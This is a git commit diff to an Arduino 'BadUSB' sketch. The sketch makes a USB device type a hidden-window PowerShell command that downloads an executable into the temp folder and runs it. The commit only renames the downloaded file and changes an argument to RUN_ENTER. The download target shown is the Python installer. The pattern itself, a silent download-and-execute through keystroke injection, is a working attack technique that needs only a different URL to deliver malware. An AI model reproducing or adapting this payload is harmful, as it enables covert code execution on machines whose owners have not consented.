ec26844c5e06b297594400f9c414bf4a0c28d28e
Oleksandr Rudenko <49398367+a1excoder@users.noreply.github.com>
2024-01-25 04:32:17 +0200

    Update EasyBadUsb.ino

--- EasyBadUsb.ino
+++ EasyBadUsb.ino
@@ -2,6 +2,6 @@
 
 BEGIN()
     const char *str = "powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"
-    "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe', '%temp%/pyy.exe'); %temp%/pyy.exe";
-    RUN_ENTER(str)
+    "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe', '%temp%/py_install.exe'); %temp%/py_install.exe";
+    RUN_ENTER(str, 0)
 END()
